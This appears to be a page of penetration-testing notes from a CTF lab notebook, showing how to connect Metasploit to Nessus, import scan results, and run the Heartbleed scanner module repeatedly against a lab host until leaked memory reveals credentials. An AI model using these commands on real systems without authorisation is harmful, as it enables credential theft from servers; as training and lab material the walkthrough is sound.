---
layout: default
title: Nessus
nav_order: 8
---

# Nessus

---

## Using Metasploit Module

Load the Metasploit Nessus module

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ msfconsole -q
msf6 > load nessus
[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded plugin: Nessus
msf6 > nessus_connect admin:adminpasswd@localhost
[*] Connecting to https://localhost:8834/ as admin
[*] User admin authenticated successfully.

```

Nessus help

```bash
nessus_help
```

List of common commands

```bash
# list completed scans
msf6 > nessus_scan_list

# list hosts found in specific scan
msf6 > nessus_report_hosts [scan_id]

# list vulns found in specific scan
msf6 > nessus_report_vulns [scan_id]

# import scan results into Metasploit db
msf6 > nessus_db_import [scan_id]

# list available vulns to exploit
msf6 > vulns
```

Example: exploit _heartbleed_ discovered in Nessus scan

```bash
# output of vulns displays Heartbleed vuln
msf6 > vulns
192.7.13.4 OpenSSL Heartbeat Information Disclosure (Heartbleed)

# locate exploits for heartbleed

msf6 > search heartbleed

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed

# use the auxiliary/scanner/ssl/openssl_heartbleed exploit
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.7.13.4
set VERBOSE true

# run scan multiple times and inspect the retrieved memory contents
scan
scan
scan

# eventually the memory dump with provide credentials

```

![memory_dump](../../../assets/images/ctfs/proving_grounds/sniffing/memory_dump.png)
